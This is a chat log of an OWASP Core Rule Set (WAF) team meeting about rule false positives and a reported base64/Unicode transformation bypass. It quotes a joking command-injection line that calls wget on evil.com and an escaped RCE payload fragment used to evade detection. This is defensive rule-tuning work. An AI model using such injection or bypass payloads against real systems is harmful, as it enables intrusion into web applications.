### Mon, Apr 3rd, 2023

**dune73** <span style="color: grey; font-size: 90%;">18:30:34 UTC</span>

<span style="font-size: 90%;">Hey, hey, it's CRS chat time tonight. Welcome everybody.</span>

**franbuehler** <span style="color: grey; font-size: 90%;">18:30:53 UTC</span>

<span style="font-size: 90%;">Hello</span>

**airween** <span style="color: grey; font-size: 90%;">18:31:06 UTC</span>

<span style="font-size: 90%;">hi there!</span>

**Matteo Pace** <span style="color: grey; font-size: 90%;">18:31:15 UTC</span>

<span style="font-size: 90%;">Good evening!</span>

**Paul Beckett** <span style="color: grey; font-size: 90%;">18:31:29 UTC</span>

<span style="font-size: 90%;">Bon journo</span>

**xanadu** <span style="color: grey; font-size: 90%;">18:31:41 UTC</span>

<span style="font-size: 90%;">Good evening! Happy Summer time / daylight savings time :sunny::sunglasses:</span>

**dune73** <span style="color: grey; font-size: 90%;">18:31:53 UTC</span>

<span style="font-size: 90%;">Hey _@Paul Beckett_, nice to see you. How is your little dog coming along?</span>

**Paul Beckett** <span style="color: grey; font-size: 90%;">18:32:25 UTC</span>

<span style="font-size: 90%;">Amber is doing well, thanks.</span>

**Paul Beckett** <span style="color: grey; font-size: 90%;">18:33:14 UTC</span>

<span style="font-size: 90%;"></span>

**dune73** <span style="color: grey; font-size: 90%;">18:33:26 UTC</span>

<span style="font-size: 90%;">_@xanadu_ prepared the agenda for tonight. (IIRC) And I think it's the best coverage we have ever had. Namely the project discussion section!</span>

**dune73** <span style="color: grey; font-size: 90%;">18:33:31 UTC</span>

<span style="font-size: 90%;">Thank you.</span>

**emphazer** <span style="color: grey; font-size: 90%;">18:33:38 UTC</span>

<span style="font-size: 90%;">hello everybody!</span>

**maxleske** <span style="color: grey; font-size: 90%;">18:33:42 UTC</span>

<span style="font-size: 90%;">Hi</span>

**dune73** <span style="color: grey; font-size: 90%;">18:33:48 UTC</span>

<span style="font-size: 90%;">Hey guys, welcome!</span>

**dune73** <span style="color: grey; font-size: 90%;">18:34:39 UTC</span>

<span style="font-size: 90%;">I also like the overview we are getting on the various subprojects. It's not that much every month, but if you follow an individual topic over months, you get the idea quite nicely. This is exactly what I had in mind. I hope it serves your need too.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:34:51 UTC</span>

<span style="font-size: 90%;">(Open to hear suggestions on the format if you think it needs improvement.)</span>

**dune73** <span style="color: grey; font-size: 90%;">18:36:10 UTC</span>

<span style="font-size: 90%;">Before we get started: Walter is excusing himself. Operating problem around DNS replication. It sounded rather nasty.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:36:49 UTC</span>

<span style="font-size: 90%;">If we look at the outside dev, then we're doing GSoC again. We are somewhat behind the official schedule, but we had a student interested in one of the more boring ideas. So this is coming along, at last (mostly my fault we are so late).</span>

**dune73** <span style="color: grey; font-size: 90%;">18:37:56 UTC</span>

<span style="font-size: 90%;">If you are following the full OWASP story, then Mark Curphey leaving the board 2 months after taking his seat was a surprise move. But consistent with his fast and powerful plans. OWASP and the board is too slow for him.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:38:26 UTC</span>

<span style="font-size: 90%;">If he is able to set up a new organisation, then there is a chance some important OWASP projects will leave OWASP and join him. Hard to assess.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:39:16 UTC</span>

<span style="font-size: 90%;">It's a bit too much drama for my taste, but there are good arguments in all directions and people try to make it all work. I think there is a problem that there is not a single org that fits every project.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:40:07 UTC</span>

<span style="font-size: 90%;">_@fzipitria_ and I had a meeting with HQ last week and for us it looks quite positive right now. HQ is quite forthcoming when it comes to our problems and we continue to feel mostly at ease within OWASP right now.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:40:47 UTC</span>

<span style="font-size: 90%;">That much on that stuff. If you want to know more, DMs are open. But it's not overly interesting unless you are hear because your are interested in governance and administration ... :slightly_smiling_face:</span>

**dune73** <span style="color: grey; font-size: 90%;">18:41:28 UTC</span>

<span style="font-size: 90%;">Are there any remarks or questions on the "Inside development" section?</span>

**dune73** <span style="color: grey; font-size: 90%;">18:42:24 UTC</span>

<span style="font-size: 90%;">Just a remark from my side on the sponsoring: Will share the budget with devs shortly. We're looking OK financially, might have to replace 1-2 sponsors. But we'll get there. dev-on-duty, dev retreat, special projects can all be financed.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:43:48 UTC</span>

<span style="font-size: 90%;">Then I suggest we move to the Project discussions. UA problem goes first.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:44:59 UTC</span>

<span style="font-size: 90%;">Is this problem limited to curl? Or do you see other tools like wgetbeing affected too?</span>

**xanadu** <span style="color: grey; font-size: 90%;">18:46:25 UTC</span>

<span style="font-size: 90%;">Good point</span>

**azurIt** <span style="color: grey; font-size: 90%;">18:47:06 UTC</span>

<span style="font-size: 90%;">If we are blocking curl then we should block also wget. So if it's not blocked now, we should add it into command list.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:47:26 UTC</span>

<span style="font-size: 90%;">I think the new include-except keyword would allow us to work around this at PL2 quite easily with a regex update, would not it?</span>

**maxleske** <span style="color: grey; font-size: 90%;">18:47:52 UTC</span>

<span style="font-size: 90%;">Which rules are we talking about specifically?</span>

**xanadu** <span style="color: grey; font-size: 90%;">18:47:53 UTC</span>

<span style="font-size: 90%;">[data "Matched Data: Wget found within REQUEST_HEADERS:User-Agent: Wget/1.21.3"]</span>

**dune73** <span style="color: grey; font-size: 90%;">18:47:54 UTC</span>

<span style="font-size: 90%;">That way the PL3 rule could stay intact and we remove curl / wget from 932236. Opinions?</span>

**xanadu** <span style="color: grey; font-size: 90%;">18:47:59 UTC</span>

<span style="font-size: 90%;">Eek, yes, wget is affected too</span>

**dune73** <span style="color: grey; font-size: 90%;">18:48:29 UTC</span>

<span style="font-size: 90%;">_@maxleske_ 932236 (PL2) and 932237 (PL3)</span>

**maxleske** <span style="color: grey; font-size: 90%;">18:50:03 UTC</span>

<span style="font-size: 90%;">Sounds good if you want to minimize FP. To be fair, the rule does what it is supposed to :slightly_smiling_face:</span>

**theMiddle** <span style="color: grey; font-size: 90%;">18:50:43 UTC</span>

<span style="font-size: 90%;">Blocking curl means create an exclusion even on our sandbox, I can't imagine any setup with this rule</span>

**dune73** <span style="color: grey; font-size: 90%;">18:51:06 UTC</span>

<span style="font-size: 90%;">Absolutely, but I think it makes sense from a convenience standpoint to remove the FP from PL2.
The point is, people will possibly disable the rule completely if they work with curl.</span>

**azurIt** <span style="color: grey; font-size: 90%;">18:51:28 UTC</span>

<span style="font-size: 90%;">We should workaround it. Like, in UA above, wget is in form Wget/ which clearly isn't an command injection.</span>

**maxleske** <span style="color: grey; font-size: 90%;">18:52:11 UTC</span>

<span style="font-size: 90%;">I doubt that there's a "standard" that we could try to follow for this _@azurIt_</span>

**azurIt** <span style="color: grey; font-size: 90%;">18:52:56 UTC</span>

<span style="font-size: 90%;">Don't know how curl UA looks like but with wget, it should be enough to make it case-sensitive.</span>

**maxleske** <span style="color: grey; font-size: 90%;">18:53:00 UTC</span>

<span style="font-size: 90%;">Or is it just name/version?</span>

**dune73** <span style="color: grey; font-size: 90%;">18:53:56 UTC</span>

<span style="font-size: 90%;">It's name/version in both cases, but that would take a chained rule and I do not think it's worth it.</span>

**maxleske** <span style="color: grey; font-size: 90%;">18:54:10 UTC</span>

<span style="font-size: 90%;">I volunteer to try and fix this. I broke it :slightly_smiling_face:</span>

**theMiddle** <span style="color: grey; font-size: 90%;">18:54:19 UTC</span>

<span style="font-size: 90%;">IFS=/;wget/evil.com :joy:</span>

**dune73** <span style="color: grey; font-size: 90%;">18:54:36 UTC</span>

<span style="font-size: 90%;">Thank you _@maxleske_</span>

**dune73** <span style="color: grey; font-size: 90%;">18:54:39 UTC</span>

<span style="font-size: 90%;">Next one.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:54:49 UTC</span>

<span style="font-size: 90%;">C9K-230327</span>

**dune73** <span style="color: grey; font-size: 90%;">18:55:12 UTC</span>

<span style="font-size: 90%;">-> [https://github.com/coreruleset/security-tracker-private/issues/7](https://github.com/coreruleset/security-tracker-private/issues/7)</span>

**dune73** <span style="color: grey; font-size: 90%;">18:56:38 UTC</span>

<span style="font-size: 90%;">I think we agree to write back to the reporter hat we will sort this out on our end (via a new new rule to detect this).
(Please do not talk about the details of the weakness here. Just tell us if you agree or if you have new arguments against this resolution.)</span>

**dune73** <span style="color: grey; font-size: 90%;">18:57:59 UTC</span>

<span style="font-size: 90%;">I do not see any disagreement on this question. Thank you.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:58:47 UTC</span>

<span style="font-size: 90%;">Referer headache. Too many FPs with our extension of Referer and UA inspection by additional rules for CRSv4. This time it's 932200.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:59:01 UTC</span>

<span style="font-size: 90%;">The proposal is to remove Referer inspection for this rule.</span>

**dune73** <span style="color: grey; font-size: 90%;">18:59:25 UTC</span>

<span style="font-size: 90%;">Does anybody have something to add here?</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:00:06 UTC</span>

<span style="font-size: 90%;">A contributor had a different opinion and states that
“…there should be a separate rule specifically targeting common bypasses.”</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:00:19 UTC</span>

<span style="font-size: 90%;">Is that practical? Removing Referer sounds much simpler.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:00:32 UTC</span>

<span style="font-size: 90%;">I did not quite understand that statement. Can you explain what he / she meant?</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:01:08 UTC</span>

<span style="font-size: 90%;">I think they are suggesting that we should have an alternative rule to inspect Referer.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:01:11 UTC</span>

<span style="font-size: 90%;">For the record: 932200 is PL2.</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:01:28 UTC</span>

<span style="font-size: 90%;">Maybe a higher PL? But that would still experience this FP, so :shrug:</span>

**dune73** <span style="color: grey; font-size: 90%;">19:01:32 UTC</span>

<span style="font-size: 90%;">So this could be a stricter sibling at PL3?</span>

**dune73** <span style="color: grey; font-size: 90%;">19:02:03 UTC</span>

<span style="font-size: 90%;">Just how frequent is this FP? (I do not have an URL example in mind)</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:02:06 UTC</span>

<span style="font-size: 90%;">Admittedly at PL 3 one should expect FPs.</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:02:25 UTC</span>

<span style="font-size: 90%;">It affects any Referer that contains a space char, e.g.
Referer: [http://www.example.com/page?param=test+test](http://www.example.com/page?param=test+test)'
Referer: [http://www.example.com/page%20test?param=test](http://www.example.com/page%20test?param=test)'</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:02:33 UTC</span>

<span style="font-size: 90%;">My understanding was more along the lines: new rule at the same PL that does better at detection without the many FP's.</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:02:34 UTC</span>

<span style="font-size: 90%;">That could be a lot of valid URLs</span>

**dune73** <span style="color: grey; font-size: 90%;">19:02:37 UTC</span>

<span style="font-size: 90%;">Ah, thanks.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:02:51 UTC</span>

<span style="font-size: 90%;">Thanks for that perspective _@maxleske_</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:03:14 UTC</span>

<span style="font-size: 90%;">What I don't know is whether we want to invest the time to cobble something working together now.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:03:29 UTC</span>

<span style="font-size: 90%;">I agree, it's perhaps a bit much at PL2 as it stands.</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:03:34 UTC</span>

<span style="font-size: 90%;">Like an RFC-check rule for Referers?</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:03:35 UTC</span>

<span style="font-size: 90%;">A rule with the same FP's at PL3 seems more practical to me at the moment</span>

**dune73** <span style="color: grey; font-size: 90%;">19:04:09 UTC</span>

<span style="font-size: 90%;">I share that impression: PL3.</span>

**franbuehler** <span style="color: grey; font-size: 90%;">19:04:42 UTC</span>

<span style="font-size: 90%;">I can remove the referer header from pl2 rule and add a new rule at pl3, if we agree on this.
Because this time, I broke it, I think...</span>

**dune73** <span style="color: grey; font-size: 90%;">19:04:48 UTC</span>

<span style="font-size: 90%;">:slightly_smiling_face:</span>

**dune73** <span style="color: grey; font-size: 90%;">19:05:01 UTC</span>

<span style="font-size: 90%;">(If I had to fix all the things I break here ...)</span>

**dune73** <span style="color: grey; font-size: 90%;">19:05:16 UTC</span>

<span style="font-size: 90%;">Anybody who does not agree with the shift to PL3?</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:06:05 UTC</span>

<span style="font-size: 90%;">Well... there will still be a lot of FP's. I'm not familiar with how PL3 is usually tuned though, so it's your call.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:06:41 UTC</span>

<span style="font-size: 90%;">Also, the spec thing could be tricky, as there are referer policies now, the default allows query strings.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:07:53 UTC</span>

<span style="font-size: 90%;">In a wider perspective, we see less and less cross-origin referers. So if you have clean URLs, then you will probably not see this FP. It's only for those who get traffic from many directions and those who have dirty URLs. So I think it's totally acceptable at PL3, namely for banking and e-commerce where referers are less frequent (than forums with tons of links left and right for example).</span>

**azurIt** <span style="color: grey; font-size: 90%;">19:08:49 UTC</span>

<span style="font-size: 90%;">Most of the traffic from search engines will, probably, be matched by that rule.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:09:29 UTC</span>

<span style="font-size: 90%;">Do Search Engines still give you referer? Is not it stripped away these days?</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:09:37 UTC</span>

<span style="font-size: 90%;">Thanks to _@xanadu_'s analysis, it looks like it might be possible to tweak the regex to get rid of many of the FP's. Let me look into that.</span>

↳ **franbuehler** <span style="color: grey; font-size: 90%;">19:10:47 UTC</span>

<span style="font-size: 90%;">If you'll look into that, will you also remove referer from pl2 rule or should I still do that?</span>

↳ **maxleske** <span style="color: grey; font-size: 90%;">19:12:26 UTC</span>

<span style="font-size: 90%;">Ideally, we don't have to remove it, so let's wait for what I can figure out.</span>

**azurIt** <span style="color: grey; font-size: 90%;">19:09:45 UTC</span>

<span style="font-size: 90%;">Referer is send by browser, not a site.</span>

**azurIt** <span style="color: grey; font-size: 90%;">19:10:38 UTC</span>

<span style="font-size: 90%;">Or is there a way a site can tell a browser to not send it?</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:10:49 UTC</span>

<span style="font-size: 90%;">Yes, with referer policies</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:10:54 UTC</span>

<span style="font-size: 90%;">But those are optional</span>

**dune73** <span style="color: grey; font-size: 90%;">19:10:55 UTC</span>

<span style="font-size: 90%;">Yes, ref policy</span>

**azurIt** <span style="color: grey; font-size: 90%;">19:10:55 UTC</span>

<span style="font-size: 90%;">Ah, ok.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:11:14 UTC</span>

<span style="font-size: 90%;">Google just sent me: [https://www.google.com/](https://www.google.com/)</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:11:24 UTC</span>

<span style="font-size: 90%;">Oh jeez, Referrer-Policy for Referer headers… whoever made that original spelling mistake in the standard document…</span>

**dune73** <span style="color: grey; font-size: 90%;">19:11:37 UTC</span>

<span style="font-size: 90%;">It's an amazing mistake.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:12:01 UTC</span>

<span style="font-size: 90%;">OK, so Max will look into this and if not, we move to PL3. OK?</span>

**dune73** <span style="color: grey; font-size: 90%;">19:13:16 UTC</span>

<span style="font-size: 90%;">I have one remaining question though: Is this the only rule where this is such a big problem, or the top of the iceberg? (Anybody has data?)</span>

**dune73** <span style="color: grey; font-size: 90%;">19:13:59 UTC</span>

<span style="font-size: 90%;">Anecdotal evidence and personal gut feelings welcome too. :innocent:</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:15:21 UTC</span>

<span style="font-size: 90%;">This one felt like an accident, a regex that just happened to match a URL with a query string and a space char.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:16:16 UTC</span>

<span style="font-size: 90%;">Looking at how actively _@jit(Xhoenix)_ reported FP's over the last couple of weeks, I suspect we would have seen more evidence if there were any.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:16:28 UTC</span>

<span style="font-size: 90%;">I lack the overview a bit, but I get the feeling we are seeing more and more Referer and UA FPs and CRSv4 is not even out yet ...</span>

**dune73** <span style="color: grey; font-size: 90%;">19:16:42 UTC</span>

<span style="font-size: 90%;">Good point about \@jit</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:16:48 UTC</span>

<span style="font-size: 90%;">That's true but I just fixed two this week.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:17:01 UTC</span>

<span style="font-size: 90%;">But his traffic is probably not representative.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:17:13 UTC</span>

<span style="font-size: 90%;">Also true</span>

**dune73** <span style="color: grey; font-size: 90%;">19:17:41 UTC</span>

<span style="font-size: 90%;">I mean we're going to do an RC2, I just think we need to be prepared to tune this down a big deal.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:18:20 UTC</span>

<span style="font-size: 90%;">See my remarks in this channel from two weeks ago, why our commercial competition might have a point aiming for a weaker turn-key solution with minimal FPs.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:19:08 UTC</span>

<span style="font-size: 90%;">But anyways, let's get going. If we continue at this pace, we're aiming for a sub-60min meeting!</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:19:38 UTC</span>

<span style="font-size: 90%;">(I see your point, just would be a bit of a shame given the amount of energy we put into the BB issues)</span>

**dune73** <span style="color: grey; font-size: 90%;">19:19:58 UTC</span>

<span style="font-size: 90%;">That is true, though.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:20:44 UTC</span>

<span style="font-size: 90%;">But we can also shift to higher PLs with the UA and Referer. So we still detect, but no longer at PL1 and maybe also not at PL2. It's what PLs are here for after all. (But I really love how we catch everything at PL2 now)</span>

**dune73** <span style="color: grey; font-size: 90%;">19:21:01 UTC</span>

<span style="font-size: 90%;">Final topic (according to the agenda): Report of possible transformation bypass.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:21:32 UTC</span>

<span style="font-size: 90%;">So we underestimated the bypass potential of base64 decoding. What I did not really get. How does that work. Can somebody give an example?</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:21:47 UTC</span>

<span style="font-size: 90%;">I think I see what the person was reporting</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:22:23 UTC</span>

<span style="font-size: 90%;">I think it summarises to:
what happens if you Base64 decode a string and the string then contains JavaScript Unicode characters and percent-encoded characters - that evades CRS detection</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:22:35 UTC</span>

<span style="font-size: 90%;">Precisely</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:22:40 UTC</span>

<span style="font-size: 90%;">Provided example was:

{"rce":"_$$\u004e\u0044_FUNC$$_\u0066unction()</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:22:49 UTC</span>

<span style="font-size: 90%;">Which becomes
{"rce":"_$$ND_FUNC$$_function()</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:23:09 UTC</span>

<span style="font-size: 90%;">doing base64 decoding at the end is fine as long as there's no other encoding in there</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:23:20 UTC</span>

<span style="font-size: 90%;">So we need to do it twice?</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:23:34 UTC</span>

<span style="font-size: 90%;">t:none,t:urlDecodeUni,t:jsDecode,t:removeWhitespace,t:base64Decode,t:urlDecodeUni,t:jsDecode,t:removeWhitespace</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:23:46 UTC</span>

<span style="font-size: 90%;">Would that catch nastiness before and after decoding?</span>

**dune73** <span style="color: grey; font-size: 90%;">19:24:06 UTC</span>

<span style="font-size: 90%;">Does ModSec allow to run transformations twice?</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:24:06 UTC</span>

<span style="font-size: 90%;">Depends. If unicode / url encoded base64 is a possible vector, then yes.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:24:10 UTC</span>

<span style="font-size: 90%;">But I doubt that</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:24:15 UTC</span>

<span style="font-size: 90%;">Apparently it is</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:24:17 UTC</span>

<span style="font-size: 90%;">I think we can just switch the order</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:24:30 UTC</span>

<span style="font-size: 90%;">"While in Javascripts atob() function, you can use unicode in the base64 string itself
 atob("\u0053GVsbG8gV29ybGQ=")
The express app I was testing errored out anytime I attempted this. That being said you can URL Encode (%53 instead of \u0053 in the above example), and it would still unbase64."</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:24:43 UTC</span>

<span style="font-size: 90%;">I don't know JavaScript, so I can't personally comment on that</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:25:28 UTC</span>

<span style="font-size: 90%;">Yes you can do that, what I mean is, is it a valid attack vector. It only works if that is being decoded by some program that can then parse the remaining string</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:26:35 UTC</span>

<span style="font-size: 90%;">Or yes, as you write, you can use it to attack an app by crashing it.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:26:49 UTC</span>

<span style="font-size: 90%;">If that's the goal, then we have to check both transformation chains</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:28:20 UTC</span>

<span style="font-size: 90%;">So in the context of a JavaScript app, that isn't a realistic attack?</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:28:38 UTC</span>

<span style="font-size: 90%;">So we can ignore it as an attack vector?</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:30:05 UTC</span>

<span style="font-size: 90%;">That string you posted above would be jsDecoded first and then base64Decoded. So that would be fine... Let me read the report quickly</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:31:20 UTC</span>

<span style="font-size: 90%;">Ok. We actually do need to do jsDecode twice, I believe. Sorry for the confusion.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:32:02 UTC</span>

<span style="font-size: 90%;">The first one we need to prevent a bypass. The base64 parser in the engine might not be able to handle the unicode escapes.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:32:16 UTC</span>

<span style="font-size: 90%;">The second one is for unicode escapes in the decoded payload</span>

**dune73** <span style="color: grey; font-size: 90%;">19:32:17 UTC</span>

<span style="font-size: 90%;">This will solve the problem here and we keep "Development of clear guidelines for transformation use and order" on the tasklist for after CRSv4. Correct?</span>

**dune73** <span style="color: grey; font-size: 90%;">19:33:49 UTC</span>

<span style="font-size: 90%;">Good. So you guys are following up on this and we're basically done with the agenda?</span>

**azurIt** <span style="color: grey; font-size: 90%;">19:34:26 UTC</span>

<span style="font-size: 90%;">Have we tested multiple decoding like this?</span>

**azurIt** <span style="color: grey; font-size: 90%;">19:35:11 UTC</span>

<span style="font-size: 90%;">I mean, it is possible to get a wrong output if you multiple decode data with some functions.</span>

↳ **maxleske** <span style="color: grey; font-size: 90%;">19:37:34 UTC</span>

<span style="font-size: 90%;">In this particular case I believe it would be OK because unicode escapes use escape sequences.</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:35:17 UTC</span>

<span style="font-size: 90%;">Good point. I wonder what Coraza would do in such a case _@JC_</span>

↳ **JC** <span style="color: grey; font-size: 90%;">19:37:20 UTC</span>

<span style="font-size: 90%;">Good question, let me check.</span>

↳ **JC** <span style="color: grey; font-size: 90%;">19:37:39 UTC</span>

<span style="font-size: 90%;">cc _@Matteo Pace_</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:35:38 UTC</span>

<span style="font-size: 90%;">Isn't there like urlencoded body processor.</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:36:58 UTC</span>

<span style="font-size: 90%;">Okay, I think that's for request body and not request headers.</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:37:20 UTC</span>

<span style="font-size: 90%;">If we did t:urlDecodeUni,t:jsDecode after t:base64Decode and there was no encoded data present then nothing happens</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:37:34 UTC</span>

<span style="font-size: 90%;">In this particular case I believe it would be OK because unicode escapes use escape sequences.</span>

↳ **maxleske** <span style="color: grey; font-size: 90%;">19:37:34 UTC</span>

<span style="font-size: 90%;">In this particular case I believe it would be OK because unicode escapes use escape sequences.</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:37:40 UTC</span>

<span style="font-size: 90%;">The same as if there was no encoded data there before t:base64Decode</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:38:35 UTC</span>

<span style="font-size: 90%;">Should I write the idea down in the GH issue _@xanadu_ or do you want to?</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:39:00 UTC</span>

<span style="font-size: 90%;">The idea to double-decode?</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:39:03 UTC</span>

<span style="font-size: 90%;">I can add it</span>

**dune73** <span style="color: grey; font-size: 90%;">19:39:45 UTC</span>

<span style="font-size: 90%;">I hope other implementations can cope with this new use of a hidden ModSec feature. If not, we'll learn about it soon enough. :slightly_smiling_face:</span>

↳ **Matteo Pace** <span style="color: grey; font-size: 90%;">19:42:14 UTC</span>

<span style="font-size: 90%;">Sorry, I lost the point, could you elaborate a little about the "hidden feature"?</span>

↳ **maxleske** <span style="color: grey; font-size: 90%;">19:42:35 UTC</span>

<span style="font-size: 90%;">applying a transformation twice</span>

↳ **maxleske** <span style="color: grey; font-size: 90%;">19:42:46 UTC</span>

<span style="font-size: 90%;">Same thing you were cc'ed about before</span>

↳ **Matteo Pace** <span style="color: grey; font-size: 90%;">19:44:16 UTC</span>

<span style="font-size: 90%;">Oh okok, thanks, thought it was an evolution of that. Coraza side I think should be okay/feasible</span>

↳ **maxleske** <span style="color: grey; font-size: 90%;">19:44:59 UTC</span>

<span style="font-size: 90%;">Great. I was just thinking back to the multiple phase issue we had discussed and the point that a transformation should only be applied once.</span>

↳ **Matteo Pace** <span style="color: grey; font-size: 90%;">19:45:02 UTC</span>

<span style="font-size: 90%;">But I will take a closer look</span>

↳ **Matteo Pace** <span style="color: grey; font-size: 90%;">19:48:47 UTC</span>

<span style="font-size: 90%;">Good question about multiphase :S With a rule ready it will be easier to think about</span>

**dune73** <span style="color: grey; font-size: 90%;">19:40:02 UTC</span>

<span style="font-size: 90%;">(If anybody wants to check ModSec 3, be my guest ...)</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:40:39 UTC</span>

<span style="font-size: 90%;">Just a general remark: looking at this we can conclude that any transformation chain with jsDecode or urlDecode potentially needs a second pass.</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:40:55 UTC</span>

<span style="font-size: 90%;">Btw, what'll be the version of ModSec for Apache after v2.9.9?</span>

↳ **airween** <span style="color: grey; font-size: 90%;">19:41:53 UTC</span>

<span style="font-size: 90%;">v2.9.10?</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:41:15 UTC</span>

<span style="font-size: 90%;">Will everything will be v3?</span>

**maxleske** <span style="color: grey; font-size: 90%;">19:41:25 UTC</span>

<span style="font-size: 90%;">Probably v2.9.10?</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:41:32 UTC</span>

<span style="font-size: 90%;">Lol</span>

**dune73** <span style="color: grey; font-size: 90%;">19:41:33 UTC</span>

<span style="font-size: 90%;">Quite sure of that.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:41:51 UTC</span>

<span style="font-size: 90%;">Apache is on 2.4.56...</span>

**airween** <span style="color: grey; font-size: 90%;">19:41:53 UTC</span>

<span style="font-size: 90%;">v2.9.10?</span>

↳ **airween** <span style="color: grey; font-size: 90%;">19:41:53 UTC</span>

<span style="font-size: 90%;">v2.9.10?</span>

**dune73** <span style="color: grey; font-size: 90%;">19:42:16 UTC</span>

<span style="font-size: 90%;">So we're really coming to an end of the meeting, I guess. Anything to add?</span>

**dune73** <span style="color: grey; font-size: 90%;">19:42:26 UTC</span>

<span style="font-size: 90%;">Before we close this: Update on status of Sandbox: The integration of the Coraza Playground has not started yet, but is right on top of the tasklist.</span>

↳ **maxleske** <span style="color: grey; font-size: 90%;">19:43:38 UTC</span>

<span style="font-size: 90%;">I've also started looking into adding coraza-httpbin to our test setup. Will take some time though.</span>

**jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:42:44 UTC</span>

<span style="font-size: 90%;">How come today's meeting start early?</span>

↳ **azurIt** <span style="color: grey; font-size: 90%;">19:43:33 UTC</span>

<span style="font-size: 90%;">It doesn't, you are late. :smile:</span>

↳ **jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:47:19 UTC</span>

<span style="font-size: 90%;">This is cheating.</span>

**xanadu** <span style="color: grey; font-size: 90%;">19:43:02 UTC</span>

<span style="font-size: 90%;">Do you follow daylight saving / summer time _@jit(Xhoenix)_?</span>

↳ **jit(Xhoenix)** <span style="color: grey; font-size: 90%;">19:44:24 UTC</span>

<span style="font-size: 90%;">Yeah. Hadn't thought will get to face it in real life.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:43:31 UTC</span>

<span style="font-size: 90%;">$ egrep -i "jsDecode.*urlDecode" *.conf | wc -l 
0
$ egrep -i "urlDecode.*jsDecode" *.conf | wc -l 
30</span>

**dune73** <span style="color: grey; font-size: 90%;">19:44:48 UTC</span>

<span style="font-size: 90%;">Daylight saving is the devil.</span>

**dune73** <span style="color: grey; font-size: 90%;">19:44:58 UTC</span>

<span style="font-size: 90%;">But does not India have 30min time-zones?</span>

**dune73** <span style="color: grey; font-size: 90%;">19:45:54 UTC</span>

